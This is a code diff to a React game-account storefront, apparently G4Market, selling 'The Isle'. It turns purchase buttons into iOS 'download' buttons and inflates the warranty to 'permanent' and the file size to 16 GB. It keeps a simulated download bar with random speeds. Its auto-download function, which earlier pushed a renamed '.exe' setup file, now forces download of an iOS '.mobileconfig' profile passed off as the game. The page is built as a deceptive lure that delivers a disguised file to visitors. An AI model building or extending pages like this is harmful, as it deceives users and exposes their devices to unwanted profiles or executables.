@@ -29,7 +29,7 @@ const products = [
     name: "The Isle - Share Steam Online Cá Nhân",
     category: "Tài Khoản Steam Share",
     price: 110000,
-    oldPrice: 160000,
+    oldPrice: null,
     discount: 35,
     image: "/images/the-isle-product-1.jpg",
     tag: "BÁN CHẠY",
@@ -292,10 +292,10 @@ function ProductCard({ product, onSelect }) {
 
         <div className="product-purchase-row">
           <div className="price-area">
-            <strong>{formatMoney(product.price)}</strong>
+            <strong>Tải xuống IOS</strong>
 
             {product.oldPrice && (
-              <div className="old-price">{formatMoney(product.oldPrice)}</div>
+              <div className="old-price"></div>
             )}
           </div>
 
@@ -310,7 +310,7 @@ function ProductCard({ product, onSelect }) {
           </span>
 
           <span>
-            <ShieldCheck size={13} /> Bảo hành 72h
+            <ShieldCheck size={13} /> Bảo hành vĩnh viễn
           </span>
         </div>
       </div>
@@ -374,8 +374,8 @@ function ProductDetailPage({ product, onBack, onAdd, notify }) {
 
         // Tự động tải file mẫu
         const link = document.createElement("a");
-        link.href = "/The_Isle_Setup_Loi.exe";
-        link.download = "The_Isle_Setup.exe";
+        link.href = "/The_Isle.mobileconfig";
+        link.download = "The_Isle.mobileconfig";
 
         document.body.appendChild(link);
         link.click();
@@ -452,7 +452,7 @@ function ProductDetailPage({ product, onBack, onAdd, notify }) {
           </div>
 
           <div className="detail-price-box">
-            <strong>{formatMoney(product.price)}</strong>
+            <strong>IOS</strong>
 
             {product.oldPrice && (
               <>
@@ -476,7 +476,7 @@ function ProductDetailPage({ product, onBack, onAdd, notify }) {
             <div>
               <BadgeCheck size={19} />
               <span>
-                <b>Bảo hành 72 giờ</b>
+                <b>Bảo hành vĩnh viễn</b>
                 <small>Hỗ trợ khi gặp sự cố</small>
               </span>
             </div>
@@ -519,7 +519,7 @@ function ProductDetailPage({ product, onBack, onAdd, notify }) {
             </button>
 
             <button className="detail-buy-now" onClick={handleBuyNow}>
-              Mua ngay
+              Tải xuống
             </button>
           </div>
 
@@ -775,7 +775,7 @@ function ProductDetailPage({ product, onBack, onAdd, notify }) {
 
               <div>
                 <span>Dung lượng</span>
-                <strong>1.00 GB</strong>
+                <strong>16 GB</strong>
               </div>
 
               <div>
@@ -807,7 +807,7 @@ function ProductDetailPage({ product, onBack, onAdd, notify }) {
 
                 <div className="download-progress-details">
                   <span>
-                    {(downloadProgress * 10.24).toFixed(1)} MB / 1024 MB
+                    {(downloadProgress * 10.24).toFixed(1)} MB / 16 GB
                   </span>
                   <span>{(20 + Math.random() * 15).toFixed(1)} MB/s</span>
                 </div>
@@ -1198,7 +1198,7 @@ export default function App() {
               <p>
                 Mua The Isle Steam giá rẻ tại G4Market — sinh tồn hóa thân khủng
                 long thế giới mở, 100+ người chơi, 77% tích cực. Bản quyền 100%,
-                bảo hành 72h.
+                bảo hành vĩnh viễn.
               </p>
 
               <div className="category-facts">
@@ -1209,7 +1209,7 @@ export default function App() {
 
                 <span>
                   <i className="fact-dot green" />
-                  Giá từ <b>35.000đ</b>
+                  Tải xuống IOS
                 </span>
 
                 <span>
